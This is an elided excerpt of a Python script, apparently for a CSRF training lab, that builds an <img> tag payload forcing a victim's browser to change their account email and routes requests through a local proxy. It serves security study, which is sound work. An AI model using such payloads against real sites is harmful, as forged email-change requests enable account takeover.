...
def csrf_test(url, use_proxy=False):
    try:
        proxies = {
            'http': '127.0.0.1:8080',        
        ...
        payload = f'<img src = "{url}my-account/change-email?email=example@example.com">'
...
def main():
    parser = argparse.ArgumentParser(description='Script for CSRF Lab 02')
    ...
    print("Starting CSRF Test...")
    print(f"Target URL: {args.url}")
    
    success, response = csrf_test(args.url, args.proxy)
    if success:
